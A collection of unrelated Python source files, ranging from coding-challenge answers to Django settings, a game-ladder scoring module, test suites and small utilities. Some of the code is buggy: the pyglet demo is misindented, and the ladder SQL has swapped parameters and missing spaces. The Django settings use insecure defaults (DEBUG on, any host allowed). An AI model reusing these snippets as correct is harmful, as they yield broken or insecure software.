{"text": "\"\"\"\nIn this challenge, we're going to learn about the difference between a class and an instance;\nbecause this is an Object Oriented concept, it's only enabled in certain languages.\n\nTask\nWrite a Person class with an instance variable, age, and a constructor that takes an integer, initial_age, as a parameter.\nThe constructor must assign initial_age to _age after confirming the argument passed as _initial_age is not negative.\nIf a negative argument is passed as initial_age, the constructor should set to and print \"Age is not valid, setting age to 0.\"\n\nIn addition, you must write the following instance methods:\n\tage_1_year() should increase the instance variable _age by 1.\n\tis_old() should perform the following conditional actions:\n\t\tIf age < 13, print \"You are young.\".\n\t\tIf age >= 13 and age < 18, print \"You are a teenager.\".\n\t\tOtherwise, print \"You are old.\".\n\"\"\"\n\n\nclass Person:\n\t# Add some more code to run some checks on initial_age\n\tdef __init__(self, initial_age):\n\t\tif initial_age < 0:\n\t\t\tprint(\"Age is not valid, setting age to 0.\")\n\t\t\tself._age = 0\n\t\telse:\n\t\t\tself._age = initial_age\n\n\t# Do some computations in here and print out the correct statement to the console\n\tdef is_old(self):\n\t\tif self._age < 13:\n\t\t\tprint(\"You are young.\")\n\t\telif (13 <= self._age) and (self._age < 18):\n\t\t\tprint(\"You are a teenager.\")\n\t\telse:\n\t\t\tprint(\"You are old.\")\n\n\t# Increment the age of the person in here\n\tdef age_1_year(self):\n\t\tself._age += 1\n\n\nT = int(input())\n\nfor i in range(0, T):\n\tage = int(input())\n\tp = Person(age)\n\tp.is_old()\n\tfor j in range(0, 3):\n\t\tp.age_1_year()\n\tp.is_old()\n\tprint(\"\")\n"}
{"text": "#!/usr/bin/env python\n\n\"\"\"Standalone script to check FAUCET configuration, return 0 if provided config OK.\"\"\"\n\n# Copyright (C) 2015 Brad Cowie, Christopher Lorier and Joe Stringer.\n# Copyright (C) 2015 Research and Education Advanced Network New Zealand Ltd.\n# Copyright (C) 2015--2017 The Contributors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport logging\nimport sys\n\ntry:\n    import valve\n    from config_parser import dp_parser\nexcept ImportError:\n    from faucet import valve\n    from faucet.config_parser import dp_parser\n\n\ndef check_config(conf_files):\n    logname = '/dev/null'\n    logger = logging.getLogger('%s.config' % logname)\n    logger_handler = logging.StreamHandler(stream=sys.stderr)\n    logger.addHandler(logger_handler)\n    logger.propagate = 0\n    logger.setLevel(logging.DEBUG)\n\n    for conf_file in conf_files:\n        parse_result = dp_parser(conf_file, logname)\n        if parse_result is None:\n            return False\n        else:\n            _, dps = parse_result\n            for dp in dps:\n                valve_dp = valve.valve_factory(dp)\n                if valve_dp is None:\n                    return False\n                print((dp.to_conf()))\n    return True\n\ndef main():\n    if check_config(sys.argv[1:]):\n        sys.exit(0)\n    else:\n        sys.exit(-1)\n\nif __name__ == '__main__':\n    main()\n"}
{"text": "#!/usr/bin/env python\n# ----------------------------------------------------------------------------\n# pyglet\n# Copyright (c) 2006-2008 Alex Holkner\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions\n# are met:\n#\n# * Redistributions of source code must retain the above copyright\n#    notice, this list of conditions and the following disclaimer.\n#  * Redistributions in binary form must reproduce the above copyright\n#    notice, this list of conditions and the following disclaimer in\n#    the documentation and/or other materials provided with the\n#    distribution.\n#  * Neither the name of pyglet nor the names of its\n#    contributors may be used to endorse or promote products\n#    derived from this software without specific prior written\n#    permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n# COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n# ----------------------------------------------------------------------------\n\n\"\"\"Demonstrates a useful pattern for pyglet applications: subclassing Window.\n\"\"\"\n\nimport pyglet\n\n\nclass HelloWorldWindow(pyglet.window.Window):\n\n    def __init__(self):\n        super().__init__()\n\n        self.label = pyglet.text.Label('Hello, world!')\n\n    def on_draw(self):\n        self.clear()\n        self.label.draw()\n\n    window = HelloWorldWindow()\n    pyglet.app.run()\n"}
{"text": "#\n# Copyright (c) 2014 - 2019  StorPool.\n# All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\"\"\" Utility functions and constants for the StorPool API bindings. \"\"\"\n\nfrom __future__ import print_function\n\nimport os.path\nimport time\n\nimport six.moves\n\n\nsec = 1.0\nmsec = 1.0e-3 * sec\nusec = 1e-6 * sec\n\nKB = 1024\nMB = 1024 ** 2\nGB = 1024 ** 3\nTB = 1024 ** 4\n\n\ndef pr(x):\n    \"\"\" Display a value and return it; useful for lambdas. \"\"\"\n    print(x)\n    return x\n\n\ndef pathPollWait(path, shouldExist, isLink, pollTime, maxTime):\n    \"\"\" Poll/listen for path to appear/disappear. \"\"\"\n    for i in six.moves.range(int(maxTime / pollTime)):\n        pathExists = os.path.exists(path)\n        if pathExists and isLink:\n            assert os.path.islink(path)\n\n        if pathExists == shouldExist:\n            return True\n        else:\n            time.sleep(pollTime)\n    else:\n        return False\n"}
{"text": "# The MIT License\n#\n# Copyright 2012 Sony Mobile Communications. All rights reserved.\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n\n\"\"\" Module to interface with Gerrit. \"\"\"\n\n\ndef from_json(json_data, key):\n    \"\"\" Helper method to extract values from JSON data.\n\n    Return the value of `key` from `json_data`, or None if `json_data`\n    does not contain `key`.\n\n    \"\"\"\n    if key in json_data:\n        return json_data[key]\n    return None\n\n\ndef escape_string(string):\n    \"\"\" Escape a string for use in Gerrit commands.\n\n    Return the string with necessary escapes and surrounding double quotes\n    so that it can be passed to any of the Gerrit commands that require\n    double-quoted strings.\n\n    \"\"\"\n\n    result = string\n    result = result.replace('\\\\', '\\\\\\\\')\n    result = result.replace('\"', '\\\\\"')\n    return '\"' + result + '\"'\n\n\nclass GerritReviewMessageFormatter(object):\n\n    \"\"\" Helper class to format review messages that are sent to Gerrit. \"\"\"\n\n    def __init__(self, header=None, footer=None):\n        \"\"\" Constructor.\n\n        If `header` is specified, it will be prepended as the first\n        paragraph of the output message.  If `footer` is specified it\n        will be appended as the last paragraph of the output message.\n\n        \"\"\"\n\n        self.paragraphs = []\n        if header:\n            self.header = header.strip()\n        else:\n            self.header = \"\"\n        if footer:\n            self.footer = footer.strip()\n        else:\n            self.footer = \"\"\n\n    def append(self, data):\n        \"\"\" Append the given `data` to the output.\n\n        If `data` is a list, it is formatted as a bullet list with each\n        entry in the list being a separate bullet.  Otherwise if it is a\n        string, the string is added as a paragraph.\n\n        Raises ValueError if `data` is not a list or a string.\n\n        \"\"\"\n        if not data:\n            return\n\n        if isinstance(data, list):\n            # First we need to clean up the data.\n            #\n            # Gerrit creates new bullet items when it gets newline characters\n            # within a bullet list paragraph, so unless we remove the newlines\n            # from the texts the resulting bullet list will contain multiple\n            # bullets and look crappy.\n            #\n            # We add the '*' character on the beginning of each bullet text in\n            # the next step, so we strip off any existing leading '*' that the\n            # caller has added, and then strip off any leading or trailing\n            # whitespace.\n            _items = [x.replace(\"\\n\", \" \").strip().lstrip('*').strip()\n                      for x in data]\n\n            # Create the bullet list only with the items that still have any\n            # text in them after cleaning up.\n            _paragraph = \"\\n\".join([\"* %s\" % x for x in _items if x])\n            if _paragraph:\n                self.paragraphs.append(_paragraph)\n        elif isinstance(data, str):\n            _paragraph = data.strip()\n            if _paragraph:\n                self.paragraphs.append(_paragraph)\n        else:\n            raise ValueError('Data must be a list or a string')\n\n    def is_empty(self):\n        \"\"\" Return True if no paragraphs have been added. \"\"\"\n        return not self.paragraphs\n\n    def format(self):\n        \"\"\" Format the message parts to a string.\n\n        Return a string of all the message parts separated into paragraphs,\n        with header and footer paragraphs if they were specified in the\n        constructor.\n\n        \"\"\"\n        message = \"\"\n        if self.paragraphs:\n            if self.header:\n                message += (self.header + '\\n\\n')\n            message += \"\\n\\n\".join(self.paragraphs)\n            if self.footer:\n                message += ('\\n\\n' + self.footer)\n        return message\n"}
{"text": "\"\"\"\nDjango settings for find-my-place project.\n\nGenerated by 'django-admin startproject' using Django 1.8.2.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/1.8/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/1.8/ref/settings/\n\"\"\"\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nimport os\nimport dj_database_url\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\n\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '**************************************************'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nTEMPLATE_DEBUG = True\n\n# Allow all host headers\nALLOWED_HOSTS = ['*']\n\n# Application definition\n\nINSTALLED_APPS = (\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n)\n\nMIDDLEWARE_CLASSES = (\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n)\n\nROOT_URLCONF = 'find-my-place.urls'\n\nWSGI_APPLICATION = 'find-my-place.wsgi.application'\n\n\n# Database\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),\n    }\n}\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'GMT'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Parse database configuration from $DATABASE_URL\nDATABASES['default'] =  dj_database_url.config()\n\n# Honor the 'X-Forwarded-Proto' header for request.is_secure()\nSECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')\n\n# Static files (CSS, JavaScript, Images)\n\nSTATIC_ROOT = 'staticfiles'\n\nSTATIC_URL = '/static/'\n\nSTATICFILES_DIRS = (os.path.join(BASE_DIR,'../static'),)\n\nTEMPLATE_DIRS = ( os.path.join(BASE_DIR, '../templates'),)\n\nSTATICFILES_FINDERS = (\n    'django.contrib.staticfiles.finders.FileSystemFinder',\n    'django.contrib.staticfiles.finders.AppDirectoriesFinder',\n)\n\n\nTEMPLATE_LOADERS = (\n    'django.template.loaders.filesystem.Loader',\n    'django.template.loaders.app_directories.Loader',\n)\n\n#EMAIL_BACKEND = 'django.core.mail.backends.console.EmailBackend'\n\nEMAIL_USE_TLS = True\nDEFAULT_FROM_EMAIL = 'username@domain.com'\nSERVER_EMAIL = 'username@domain.com'\nEMAIL_HOST = 'smtp.domain.com'\nEMAIL_HOST_USER = 'username@domain.com'\nEMAIL_HOST_PASSWORD = '********'\nEMAIL_PORT = 587"}
{"text": "# Copyright (c) 2013 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nimport json\n\nfrom telemetry.page import page_benchmark\n\n# Test how long Chrome takes to load when warm.\nclass PerfWarm(page_benchmark.PageBenchmark):\n  def __init__(self):\n    super(PerfWarm, self).__init__(needs_browser_restart_after_each_run=True,\n                                   discard_first_result=True)\n\n  def CustomizeBrowserOptions(self, options):\n    options.AppendExtraBrowserArg('--dom-automation')\n    options.AppendExtraBrowserArg('--reduce-security-for-dom-automation-tests')\n\n  def MeasurePage(self, page, tab, results):\n    result = tab.EvaluateJavaScript(\"\"\"\n      domAutomationController.getBrowserHistogram(\n          \"Startup.BrowserMessageLoopStartTimeFromMainEntry_Exact\")\n      \"\"\")\n    result = json.loads(result)\n    startup_time_ms = 0\n    if 'params' in result:\n      startup_time_ms = result['params']['max']\n    else:\n      # Support old reference builds that don't contain the new\n      # Startup.BrowserMessageLoopStartTimeFromMainEntry_Exact histogram.\n      result = tab.EvaluateJavaScript(\"\"\"\n        domAutomationController.getBrowserHistogram(\n            \"Startup.BrowserMessageLoopStartTimeFromMainEntry\")\n        \"\"\")\n      result = json.loads(result)\n      startup_time_ms = \\\n          (result['buckets'][0]['high'] + result['buckets'][0]['low']) / 2\n\n    results.Add('startup_time', 'ms', startup_time_ms)\n"}
{"text": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Fri Aug 15 14:37:02 2014\n\n@author: Niel\n\"\"\"\nfrom os import path, listdir, remove\nimport pandas as pd\nimport datetime as dt\nimport calendar as cal\nimport sys\n\ndef last_dayof_prev_month(year, month):\n    if (month == 1):\n        month = 12\n        year = year - 1\n        return last_dayof_month(year, month)\n    else:\n        return last_dayof_month(year, month)\n\ndef last_dayof_month(year, month):\n    return dt.date(year, month, cal.monthrange(year, month)[1])\n\ndef last_month_end():\n    td = dt.datetime.today()\n    if (td.month == 1):\n        lastmonth = 12\n        year = td.year - 1\n    else:\n        lastmonth = td.month - 1\n        year = td.year\n\n    enddt = last_dayof_month(year, lastmonth)\n    return(enddt)\n\ndef date_days_ago(days=0):\n    td = dt.datetime.today()\n    tmpd = td - dt.timedelta(days=days)\n\n    return str(tmpd.date())\n\n# helper functions    \ndef clear_tempfiles(root):\n    '''\n    \n    '''\n    print('Looking in ' + root + '...')\n    if listdir(root):\n        # this folder contains files and sub directories\n        for f in listdir(root):\n            # for every file or sub directory in this directory \n        \n            subpath = path.join(root, f)\n            if path.isfile(subpath):\n                # check if it is a file\n                print('Deleting file: ' + subpath)\n                # Delete file from directory\n                remove(subpath)\n            elif path.isdir(subpath):\n                # else check if it is a directory\n            \n                # clear all files in directory and traverse subdirectories\n                clear_tempfiles(subpath)\n        "}
{"text": "import pygame\nimport os\nimport random\nimport res\n\nclass Camera:\n\n\tdef __init__(self):\n\t\tself.x = self.y = 0\n\t\tself.speed = 500\n\n\tdef update(self, dt, key_state):\n\t\tspeed = self.speed * dt\n\t\tif key_state[0]:\n\t\t\tself.x = min(self.x + speed, 0)\n\t\tif key_state[1]:\n\t\t\tself.x = max(self.x - speed, res.WIN_WIDTH - res.MAP_WIDTH)\n\t\tif key_state[2]:\n\t\t\tself.y = min(self.y + speed, 0)\n\t\tif key_state[3]:\n\t\t\tself.y = max(self.y - speed, res.WIN_HEIGHT - res.MAP_HEIGHT)\n\n\tdef convert_pos(self, pos):\n\t\treturn (pos[0] - self.x, pos[1] - self.y)\n\n\tdef get_pos(self):\n\t\treturn (self.x, self.y)\n\n\tdef set_pos(self, pos):\n\t\tself.x, self.y = pos\n\n\nclass Hud:\n\n\tdef __init__(self):\n\t\tpass\n\n\n\nclass Stars:\n\n    def __init__(self, num_stars=256):\n        self.num_stars = num_stars\n        self.stars = []\n        self.gen_stars()\n\n    def draw(self, surface):\n        for star in self.stars:\n            pygame.draw.rect(surface, star['color'], star['rect'], 1)\n\n    def update(self, dt):\n        for i, star in enumerate(self.stars):\n            speed = star['speed'] * dt\n            x, y = star['rect'].topleft\n            x -= speed\n            if x < 0:\n                x, y = (res.MAP_WIDTH + x, random.randint(0, res.MAP_HEIGHT))\n            self.stars[i]['rect'].topleft = (int(x), y)\n\n    def gen_stars(self):\n        for _ in range(self.num_stars):\n            x, y = self.get_random_cords()\n            star = {'speed': random.randint(1, 100),\n                    'rect': pygame.Rect((x, y), (random.randint(2, 4),) * 2),\n                    'color': (random.randint(153, 204), random.randint(153, 204), random.randint(178, 229))}\n            self.stars.append(star)\n\n    def get_random_cords(self):\n        return (random.randint(0, res.MAP_WIDTH - 1), random.randint(0, res.MAP_HEIGHT - 1))\n"}
{"text": "import unittest\nimport sys\nimport os\n\nsys.path.insert(\n    0,\n    os.path.abspath(\n        os.path.join(\n            os.path.dirname(__file__),\n            \"..\")))\n\nfrom emotion.axis import AxisState\n\n\nclass TestStates(unittest.TestCase):\n\n    def setUp(self):\n        pass\n\n    def test_states(self):\n        # empty state\n        s = AxisState()\n        self.assertEquals(s, \"UNKNOWN\")\n\n        # moving\n        s.set(\"MOVING\")\n        self.assertEquals(s, \"MOVING\")\n\n        # moving => not ready\n        self.assertFalse(s.READY)\n\n        # now ready but no more moving\n        s.set(\"READY\")\n        self.assertTrue(s.READY)\n        self.assertFalse(s.MOVING)\n\n        # custom state\n        s.create_state(\"PARKED\", \"c'est ma place !!\")\n        s.set(\"PARKED\")\n        self.assertTrue(s.PARKED)\n        # still ready\n        self.assertTrue(s.READY)\n        self.assertEquals(s, \"PARKED\")\n\n        # Prints string of states.\n        self.assertTrue(isinstance(s.current_states(), str))\n\n        # bad name for a state\n        self.assertRaises(ValueError, s.create_state, \"A bad state\")\n\n    def test_init_state(self):\n        self.assertEquals(AxisState(), \"UNKNOWN\")\n\n    def test_desc(self):\n        s = AxisState((\"KAPUT\", \"auff\"), \"LIMNEG\", \"READY\")\n        self.assertTrue(s.READY)\n        self.assertEquals(s._state_desc[\"KAPUT\"], \"auff\")\n        self.assertEquals(s._state_desc[\"LIMNEG\"], \"Hardware low limit active\")\n\n    def test_from_current_states_str(self):\n        s = AxisState((\"KAPUT\", \"auff\"), \"LIMNEG\", \"READY\")\n        states_str = s.current_states()\n        t = AxisState(states_str)\n        self.assertTrue(t.READY)\n        self.assertEquals(t._state_desc[\"KAPUT\"], \"auff\")\n        self.assertEquals(t._state_desc[\"LIMNEG\"], \"Hardware low limit active\")\n        self.assertEquals(s.current_states(), t.current_states())\n        u = AxisState()\n        v = AxisState(u.current_states())\n        self.assertEquals(u.current_states(), v.current_states())\n\n    def test_state_from_state(self):\n        s = AxisState(\"READY\")\n        t = AxisState(s)\n        self.assertEquals(s.current_states(), t.current_states())\n       \n    def test_clear_state(self):\n        s = AxisState(\"READY\")\n        s.clear()\n        self.assertEquals(s, \"UNKNOWN\")\n\n        s.set(\"MOVING\")\n        self.assertEquals(s, \"MOVING\")\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "# -*- coding: utf-8 -*-\n# Generated by Django 1.9.1 on 2016-07-13 22:59\nfrom __future__ import unicode_literals\n\nimport core.models\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        ('patient', '0001_initial'),\n        ('healthprofessional', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='APIUser',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('password', models.CharField(max_length=128, verbose_name='password')),\n                ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')),\n                ('username', models.CharField(max_length=128)),\n            ],\n            options={\n                'abstract': False,\n            },\n        ),\n        migrations.CreateModel(\n            name='HealthProfessionalCoupling',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('external_healthprofessional_id', models.CharField(max_length=128)),\n                ('extra_data', models.TextField(blank=True, null=True)),\n                ('api_user', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='api.APIUser')),\n                ('healthprofessional', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, to='healthprofessional.HealthProfessional')),\n            ],\n        ),\n        migrations.CreateModel(\n            name='PatientCoupling',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('external_patient_id', models.CharField(max_length=128)),\n                ('extra_data', models.TextField(blank=True, null=True)),\n                ('api_user', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='api.APIUser')),\n                ('patient', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, to='patient.Patient')),\n            ],\n        ),\n        migrations.CreateModel(\n            name='TempPatientData',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('json_data', core.models.EncryptedTextField(blank=True, null=True)),\n            ],\n        ),\n        migrations.CreateModel(\n            name='Token',\n            fields=[\n                ('key', models.CharField(max_length=40, primary_key=True, serialize=False)),\n                ('created', models.DateTimeField(auto_now_add=True)),\n                ('user', models.OneToOneField(on_delete=django.db.models.deletion.CASCADE, related_name='auth_token', to='api.APIUser')),\n            ],\n            options={\n                'abstract': False,\n            },\n        ),\n    ]\n"}
{"text": "import logging\nimport asyncio\n\nimport server.db as db\nfrom server.abc.base_game import InitMode\nfrom server.players import Player\n\nlogger = logging.getLogger(__name__)\n\nfrom .game import Game, ValidityState\n\nimport operator\nimport config\n\n\nclass LadderGame(Game):\n    \"\"\"Class for 1v1 ladder game\"\"\"\n    init_mode = InitMode.AUTO_LOBBY\n    \n    def __init__(self, id, *args, **kwargs):\n        super(self.__class__, self).__init__(id, *args, **kwargs)\n\n        self.max_players = 2\n\n    def rate_game(self):\n        if self.validity == ValidityState.VALID:\n            new_ratings = self.compute_rating()\n            self.persist_rating_change_stats(new_ratings, rating='ladder1v1')\n\n    def is_winner(self, player: Player):\n        return self.get_army_result(self.get_player_option(player.id, 'Army')) > 0\n\n    def on_game_end(self):\n        super().on_game_end()\n        if self.validity != ValidityState.VALID:\n            return\n        asyncio.async(self._on_game_end())\n\n    @asyncio.coroutine\n    def _on_game_end(self):\n        if self.is_draw:\n            with (yield from db.db_pool) as conn:\n                with (yield from conn.cursor()) as cursor:\n                    yield from cursor.execute(\"UPDATE table_map_features SET num_draws = (num_draws +1) \"\n                                              \"WHERE map_id = %s\", (self.map_id, ))\n            return\n\n        # The highest league of any player in the game, and a flag indicating if all players are in\n        # the same league.\n        maxleague = max(iter(self.players), key=operator.itemgetter(\"league\"))\n        evenLeague = all(self.players, lambda p: p.league == self.players[0].league)\n\n        with (yield from db.db_pool) as conn:\n            with (yield from conn.cursor()) as cursor:\n                for player in self.players:\n                    if self.is_winner(player):\n                        score_change = 1\n                        if not evenLeague:\n                            if player.league == maxleague:\n                                score_change = 0.5\n                            else:\n                                score_change = 1.5\n                    else:\n                        score_change = -0.5\n                        if not evenLeague:\n                            if player.league == maxleague:\n                                score_change = 1\n                            else:\n                                score_change = 0\n\n                    yield from cursor.execute(\"UPDATE {} \"\n                                              \"SET score = GREATEST(0, (score + %s))\"\n                                              \"WHERE idUser = %s\".format(config.LADDER_SEASON),\n                                              (score_change, player.id))\n\n                    yield from cursor.execute(\"SELECT league, score FROM {}\"\n                                              \"WHERE `idUser` = %s\".format(config.LADDER_SEASON),\n                                              (player.id, ))\n\n                    pleague, pscore = yield from cursor.fetchone()\n                    # Minimum scores, by league, to move to next league\n                    # But, but, these are defined in the database (threshold values)\n                    #  Why are they hardcoded here?!\n                    # This query shouldprobably be replaced with a trigger that makes sure to update\n                    # league counters whenever an update happens.\n                    # Alternatively, and perhaps preferably, we can just stop tracking leagues\n                    # explicitly in the database: just store scores and infer leagues from it using\n                    # thresholds defined in a league-defining table.\n                    league_incr_min = {1: 50, 2: 75, 3: 100, 4: 150}\n                    if pleague in league_incr_min and pscore > league_incr_min[pleague]:\n                        pleague += 1\n                        yield from cursor.execute(\"UPDATE {} SET league = %s, score = 0\"\n                                                  \"WHERE `idUser` = %s\".format(config.LADDER_SEASON),\n                                                  (player.id, pleague))\n\n                    yield from cursor.execute(\"SELECT name \"\n                                              \"FROM `ladder_division` \"\n                                              \"WHERE `league` = ? AND threshold >= ?\"\n                                              \"ORDER BY threshold ASC LIMIT 1\",\n                                              (pleague, pscore))\n\n                    player.division = yield from cursor.fetchone()\n\n    @property\n    def is_draw(self):\n        for army in self.armies:\n            for result in self._results[army]:\n                if result[1] == 'draw':\n                    return True\n        return False\n\n    def get_army_result(self, army):\n        \"\"\"\n        The head-to-head matchup ranking uses only win/loss as a factor\n        :param army:\n        :return:\n        \"\"\"\n        for result in self._results[army]:\n            if result[1] == 'victory':\n                return 1\n        return 0\n\n\n"}
{"text": "# -*- coding: utf-8 -*-\n# Copyright 2017 OpenSynergy Indonesia\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nfrom openerp import models, fields, api\n\n\nclass BuktiPotongPPhF113313In(models.Model):\n    _name = \"l10n_id.bukti_potong_pph_f113313_in\"\n    _inherit = \"l10n_id.bukti_potong_pph\"\n    _table = \"l10n_id_bukti_potong_pph\"\n    _description = \"Bukti Potong PPh f.1.1.33.13 In\"\n\n    @api.model\n    def _default_type_id(self):\n        return self.env.ref(\n            \"l10n_id_taxform_bukti_potong_pph_f113313.\"\n            \"bukti_potong_pph_type_f113313_in\").id\n\n    type_id = fields.Many2one(\n        default=lambda self: self._default_type_id(),\n    )\n\n    @api.model\n    def search(self, args, offset=0, limit=None, order=None, count=False):\n        type_id = self.env.ref(\n            \"l10n_id_taxform_bukti_potong_pph_f113313.\"\n            \"bukti_potong_pph_type_f113313_in\")\n        args.append((\"type_id\", \"=\", type_id.id))\n        return super(BuktiPotongPPhF113313In, self).search(\n            args=args, offset=offset, limit=limit,\n            order=order, count=count)\n"}
{"text": "#!/usr/bin/python -Wall\n# -*- coding: utf-8 -*-\n\"\"\"\n<div id=\"content\">\n<div style=\"text-align:center;\" class=\"print\"><img src=\"images/print_page_logo.png\" alt=\"projecteuler.net\" style=\"border:none;\" /></div>\n<h2>Largest palindrome product</h2><div id=\"problem_info\" class=\"info\"><h3>Problem 4</h3><span>Published on Friday, 16th November 2001, 06:00 pm; Solved by 254694; Difficulty rating: 5%</span></div>\n<div class=\"problem_content\" role=\"problem\">\n<p>A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91 * 99.</p>\n<p>Find the largest palindrome made from the product of two 3-digit numbers.</p>\n</div><br />\n<br /></div>\n\"\"\"\n\n# 999 * 999 = 998001\n# 998 comp 100\n\ndef L_comp(n, s):\n    if (n == 2) :\n        if (s[0] == s[3] and s[1] == s[2]) :\n            return True\n        else :\n            return False\n    elif (n == 3) :\n        if (s[0] == s[5] and s[1] == s[4] and s[2] == s[3]) :\n            return True\n        else :\n            return False\n\ndef L_mutiple(n, max_num):\n    max_range = max_num -1\n    min_range = max_num /2\n    for i in range(max_range, min_range, -1):\n        for j in range(max_range, min_range, -1):\n            ret = i * j\n            s = \"%d\" % (ret)\n            result = L_comp(n, s)\n            if (result):\n                return ret\n\n    return -1\n\n\ndef L_plaindrome(n):\n    if (n != 2 and n != 3):\n        print \"invalid input\"\n        return -1\n\n    max_num = 1\n    for i in range (0, n):\n        max_num *= 10\n\n    return L_mutiple(n, max_num)\n\nprint L_plaindrome(3)\n"}
